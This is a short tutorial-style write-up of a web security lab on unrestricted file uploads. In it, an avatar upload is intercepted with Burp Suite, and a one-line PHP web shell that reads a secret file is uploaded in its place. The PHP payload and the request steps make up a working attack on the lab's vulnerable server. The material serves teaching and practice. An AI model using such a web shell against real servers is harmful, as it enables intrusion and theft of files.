# File Uploads: Unrestricted File Uploads!

## Introduction
File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size.

## How to identify

From a security perspective, the worst possible scenario is when a website allows you to upload server-side scripts, such as PHP, Java, or Python files, and is also configured to execute them as code. This makes it trivial to create your own web shell on the server. 

**Upload Section** :
Any type of upload can possibly have a upload vulnerability. Make sure you remember this when you encounter a upload section in real life.



## Code/tools/websites

### Tools
- **Burp Suite:** A web vulnerability scanner with tools for manual testing.

## Sample problem

### Problem Statement
This lab contains a vulnerable image upload function.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.

### Solution
Here we have a upload section under My Accounts tab to upload the Avatar.
We use burpsuite proxy here to interupt the Requests. 

- **Initial Request for JPG**:
The Content-Type response header may provide clues as to what kind of file the server thinks it has served. If this header hasn't been explicitly set by the application code, it normally contains the result of the file extension/MIME type mapping. 
  ```
  Content-Disposition: form-data; name="avatar"; filename="filename.jpg"
  Content-Type: image/jpeg
  ``` 

- **Modifying the Request**:
Since we don't have the proper validations set in the website. We can just upload the php file directly.
  ```php
   <?php echo file_get_contents('/home/carlos/secret'); ?>
  ```

- **DONE!!!**
Now just use burp repeater to get the flag!

## Conclusion
 In the wild, it's unlikely that you'll find a website that has no protection against file upload attacks like we saw in this lab.
